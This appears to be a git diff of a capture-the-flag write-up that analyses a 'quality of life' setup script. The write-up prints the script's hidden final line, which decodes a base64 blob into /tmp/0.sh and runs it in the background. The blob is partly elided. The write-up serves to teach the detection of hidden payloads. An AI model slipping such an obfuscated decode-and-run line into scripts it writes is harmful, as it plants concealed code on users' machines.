@@ -4,5 +4,8 @@ Unfortunately, I do not have access to the original challenge statement, but it 
 
 ## Solving
 
+![image](https://github.com/user-attachments/assets/710acb2e-cbea-489c-ac08-c4962739b961)
 
-We start with a zip file called chest-mix.zip, and based on what we are told, we can assume this is probably a folder for a Minecraft map/world. Quickly unzipping it and looking inside will confirm this, as we can see exactly what we would 
+At first glance the script seems pretty harmless, even calling itself a QOL (Quality of Life) script meant to just make some minor improvements to the system. Update/upgrade packages, install some tools, create some aliases, blah blah blah. BUT if you keep scrolling, down at the very bottom we see this:
+
+`sudo echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSI ... AvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d >> /tmp/0.sh && chmod +x /tmp/0.sh && /bin/bash /tmp/0.sh &`
